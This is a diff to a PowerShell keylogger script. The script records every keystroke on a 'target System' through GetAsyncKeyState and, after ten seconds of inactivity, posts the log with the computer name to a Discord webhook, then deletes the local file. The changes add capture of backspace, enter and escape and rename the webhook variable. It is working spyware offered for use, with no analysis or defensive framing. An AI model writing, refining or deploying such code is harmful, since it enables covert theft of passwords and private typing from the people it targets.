@@ -5,6 +5,8 @@ SYNOPSIS
 This script gathers Keypress information and posts to a discord webhook address with the results only
 when the keyboard is inactive for more than 10 seconds and only if keys were pressed before that.
 
+
+
 USAGE
 1. Input your credentials below
 2. Run Script on target System
@@ -45,7 +47,7 @@ While ($true){
       while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
       # Start the loop with 30 ms delay between keystate check
       Start-Sleep -Milliseconds 30
-        for ($asc = 9; $asc -le 254; $asc++){
+        for ($asc = 8; $asc -le 254; $asc++){
         # Get the key state. (is any key currently pressed)
         $keyst = $API::GetAsyncKeyState($asc)
           # If a key is pressed
@@ -62,8 +64,13 @@ While ($true){
           $logchar = New-Object -TypeName System.Text.StringBuilder
             # Define the key that was pressed          
             if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
+              # Check for non-character keys
+              $LString = $logchar.ToString()
+                if ($asc -eq 8) {$LString = "[BKSPC]"}
+                if ($asc -eq 13) {$LString = "[ENT]"}
+                if ($asc -eq 27) {$LString = "[ESC]"}
             # Add the key to the file
-            [System.IO.File]::AppendAllText($logPath, $logchar, [System.Text.Encoding]::Unicode) 
+            [System.IO.File]::AppendAllText($logPath, $LString, [System.Text.Encoding]::Unicode) 
             }
           }
         }
@@ -75,7 +82,7 @@ While ($true){
       $fileContent = Get-Content -Path $logPath -Raw
       $escmsgsys = $fileContent -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
       $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json
-      Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+      Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
       #Remove log file and reset inactivity check 
       Remove-Item -Path $logPath -Force
       $keyPressed = $false
@@ -85,4 +92,3 @@ While ($true){
   $LastKeypressTime.Restart()
   Start-Sleep -Milliseconds 10
 }
-
